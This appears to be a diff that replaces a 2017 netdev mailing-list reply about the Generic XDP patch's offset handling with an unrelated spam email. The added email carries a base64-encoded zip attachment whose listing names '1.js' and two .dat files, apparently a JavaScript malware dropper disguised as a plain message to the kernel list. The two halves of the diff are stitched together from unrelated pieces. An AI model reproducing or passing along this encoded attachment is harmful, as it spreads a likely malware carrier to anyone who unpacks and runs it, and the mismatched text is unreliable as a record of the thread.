@@ -1,63 +1,56 @@
-From: William Tu <u9012063@gmail.com>
-Subject: Re: [PATCH v4 net-next RFC] net: Generic XDP
-Date: Fri, 14 Apr 2017 09:33:12 -0700
-Message-ID: <CALDO+SZwdxCwsARxFKpEXEDKK8+94t-_dVdJNWiCDgx4yWUYqw@mail.gmail.com>
-References: <20170413.120925.2082322246776478766.davem@davemloft.net>
+From: <nmckenna@prospercanada.org>
+Subject: 47141 netdev
+Date: Fri, 14 Apr 2017 16:37:27 -0000
+Message-ID: <149218784732.10870.6900077959205116630@telenet.ru>
+Reply-To: <nmckenna@prospercanada.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Cc: Linux Kernel Network Developers <netdev@vger.kernel.org>,
-        xdp-newbies@vger.kernel.org
-To: David Miller <davem@davemloft.net>
+Content-Type: application/zip; name="876027806.zip"
+Content-Transfer-Encoding: base64
+To: "netdev" <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-io0-f195.google.com ([209.85.223.195]:32768 "EHLO
-        mail-io0-f195.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751654AbdDNQdx (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Fri, 14 Apr 2017 12:33:53 -0400
-In-Reply-To: <20170413.120925.2082322246776478766.davem@davemloft.net>
+Received: from 101.180-224-87.telenet.ru ([87.224.180.101]:51479 "HELO
+        telenet.ru" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751657AbdDNQhb (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Fri, 14 Apr 2017 12:37:31 -0400
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-On Thu, Apr 13, 2017 at 9:09 AM, David Miller <davem@davemloft.net> wrote:
->
-[snip]
-
-
-> +static u32 netif_receive_generic_xdp(struct sk_buff *skb,
-> +                                    struct bpf_prog *xdp_prog)
-> +{
-> +       struct xdp_buff xdp;
-> +       u32 act = XDP_DROP;
-> +       void *orig_data;
-> +       int hlen, off;
-> +
-> +       if (skb_linearize(skb))
-> +               goto do_drop;
-> +
-> +       /* The XDP program wants to see the packet starting at the MAC
-> +        * header.
-> +        */
-> +       hlen = skb_headlen(skb) + skb->mac_len;
-> +       xdp.data = skb->data - skb->mac_len;
-> +       xdp.data_end = xdp.data + hlen;
-> +       xdp.data_hard_start = xdp.data - skb_headroom(skb);
-> +       orig_data = xdp.data;
-> +
-> +       act = bpf_prog_run_xdp(xdp_prog, &xdp);
-> +
-> +       off = xdp.data - orig_data;
-
-should we do "orig_data - xdp.data" instead?
-The 'off' might be < 0, when pushing new header.
-
-> +       if (off)
-> +               __skb_push(skb, off);
-
-When doing encapsulation by calling xdp_adjust_head(skb, offset), the
-offset is < 0 in order to make extra room in the front ; so xdp.data <
-orig_data, off < 0.
-
-But if we are decapsulating protocol, then off > 0, and maybe we
-should call __skb_pull()?
-
-Thanks,
-William
+UEsDBBQAAAAIACCUjkpWC8je0gYAADcMAAAEAAAAMS5qc41WW3PiRhN9T1X+gz4qFcG6g21ZWq9N
+/ECLmw1rbG72TvGChRiuuiEJ8H757+megbzYqcoDgzTq6T59+nRL+SQxXt3oMOtsh3m7dp/2R1Pj
+zgj8nVH10kXuv3bflr6XFgvblr9elydRtF54k3QRPhZKlV9/4fPLuvdeHTVe2/Gw2X3bZC/36ecu
+dn03WTyl5e3c76z/OT5pxf2nl/Yg6mU/7iV+9/8lPp2NBveBLDcWnXr/0E/9DT2ruwPlaTEzih88
+lRvheuon9f1im26LBfd2PH5ZBNNw1y+UjLs7I00yv2T81DjaXhRs/TBL48Gu2piP6vsOISnIPXjB
+l10kMx88wARBfvmN9lJAMAtnv/5SALStQ7YEk3ZsBMtEcLCBpo0WRMpCwsHkJ64P+QphD1I8qwdT
+OrKW4OemfQumTccPma+eIKS4SnI+1syWEgIMTNs27Yrp1MC0oGFaCC7g3ktN4EjZUv0TKI5u2lYE
+EvBA97YFro85rvZHz7Qv4Bkp+BqkTxByOgp4S5BtioUBBCbaTS9JAkLro5fDKsaI8rJtYEQEAmsm
+BW0ArS5hAPag3VsPI4QR9DguYdFQUBIDYDFi4gBWe5RCk/c8JQbQR6aAnNjYRRgK7D4ScoeoPXJs
+N4E28REedBSOQSFsVKxXAIkXbWlaDbpT15aLeySCmJch5ClKDyE0bcUSOg0mB7UlRPKADJGoYoDA
+CPF5SvVBqUEra1B1QtulCj8DLVBjXqDJ/ilN0kjIZNiKJ0qBDRRRBIac0vMUmZoEvHyJJjIrJleM
+87DggKwkuzlEYKn5K9JcANgCjBXQYIYyxUxDOXFj4whkmEDg6Y2cTmZEAsuRgVS0NmtcJNvE6zo9
+Q7jGOktO5VPT7Kvjt12Psl1yutCEFLwIZnQ8RghRCQXYFCqscNd0yDk6FVSqr3DJKqpwlVNzgLo5
++q4oBzXOuIJ6IYMKV4NUhXBDmBy06N5m9hRophdP6lIrA9O3Et4ll81W4WtIVBOV3Gra/oGUSFIh
+pTQRnhMZcZ7EF9w3caTlQ87rWqu2vSTq8sR0XOakpUOYdot6YIkpxCHKbBNzQf6vuG2SLjAmQUGL
+yjQLcRVptNBMAJeJpsBpzSlfFiVT4aiaNxe4mnNVbJtvuSA8RuZeAJlk4okMh3kiZxY8jEbks6e1
+fqSVFCKjGevgVjXfiW+H9MbzYEW2c8qLgd4CPhAPPUDmYZhTQ+8QMkZyFB/B0+fVAHOIT8di+mll
+ellA1DXmDc8eJFsieKjsc+CuUprntOAZWLgSI1SK0hRqB06NhT+kNgRJfRBSdCIKRj8TyZdqbkJD
+YeLev2JkNS6QRc2Qp9KjICrGDxqNpFB5RHyLDzjiicMgm4ADmSUQQ5RJrJFoZz/xiEOPCaiBbjtK
+AnmOujDMU5UDp0o66cUZrqiHVnGkDUmcnDQhM7UAHdrUFzUOekwKkCCeBEoF8mAvYUQQWrDCQMKx
+ebixqcOWqgntuqoWV9bR4x15XigvDTaw0CXv7JxHi9rnNOsYxBnRyABvea2wujRd1Pr8MiCFLJnq
+ICBS3tUUQ9gB5goJw/DorbBUXaYEqEaRHvGaL5PQqVcaM6NHiX2arbaaHnp4HreQGytG1WVsSI7q
+6jXIyr86Culky+2qrhSvOi+8afx2dnZXOH4ZbGujp06VXtLo9zfuMqDX8dXVlXXjfLs4P11UDLZ8
+W0we937ebe++B/11c7rkN/fJzWS1OTTcbj9OXvzBY5r/4IdVdFttWjrfx+Mt/YeNdEd/E/ol/ni8
+WXhJ2Ff7g/F4Rxf39AtqtHRfaOEjRpCOxx5dDHu0qAz4os6G9Evpl9PPT9h+EQbjMTs88NGBT8sm
+OR0LOdCA8fr5ZF0smrmYiMRIX+cDIUWQPYl4LR5EX7yIN3pSrYtEGHfCEEtR98S7qIqRaIhX0Rbx
+UDQFfYSJjGzvRSrKPeEL2fPFZCqKE7ESzIXokq+YnLzQw8GjIE5EWSS+iMR6IjzhF8/HVRTuuRQg
+jIIoiJIolenBfJIINxRTX1TToqD6iCfRofBpQgGRnPU3whXLQJQqZqmc+NF64rEzcS6BClLiL7VZ
+mBhFrsth23mfrd32wEt6Mt08vXKBLyqf7f/52ddZee0HMp1/duDsrGT8/Ew/n7nxKCs3nPqU0kdP
+JeMPVQdJVYjXD/2Xt0m1nny5vHEu7XPnq3Nz8fX49Vn8EO5/d58dvbr+ZjnWuWNZV/a3kvH778Z/
+PWldXlxefz2/vLmwr60SZ/hR92d3Rj9NFvSZPEvCjXtM7WOIUsX46y/dH7Xp5HW7XO+kl/n9UdJp
+p3tiSinxg38uIB37G1BLAwQUAAAACABwS45KNiRBzwQAAAACAAAABQAAADIuZGF0MzAEAFBLAwQU
+AAAACABsS45KdxVa1gQAAAACAAAABQAAADEuZGF0MzQEAFBLAQIfABQAAAAIACCUjkpWC8je0gYA
+ADcMAAAEACQAAAAAAAAAIAAAAAAAAAAxLmpzCgAgAAAAAAABABgARyvMZjS10gE2BMxmNLXSAU6i
+2HMvtdIBUEsBAh8AFAAAAAgAcEuOSjYkQc8EAAAAAgAAAAUAJAAAAAAAAAAgAAAA9AYAADIuZGF0
+CgAgAAAAAAABABgAkl7YMui00gFqPQtwIrXSAWo9C3AitdIBUEsBAh8AFAAAAAgAbEuOSncVWtYE
+AAAAAgAAAAUAJAAAAAAAAAAgAAAAGwcAADEuZGF0CgAgAAAAAAABABgA3kgwLui00gH8AFBvIrXS
+AfwAUG8itdIBUEsFBgAAAAADAAMABAEAAEIHAAAAAA==
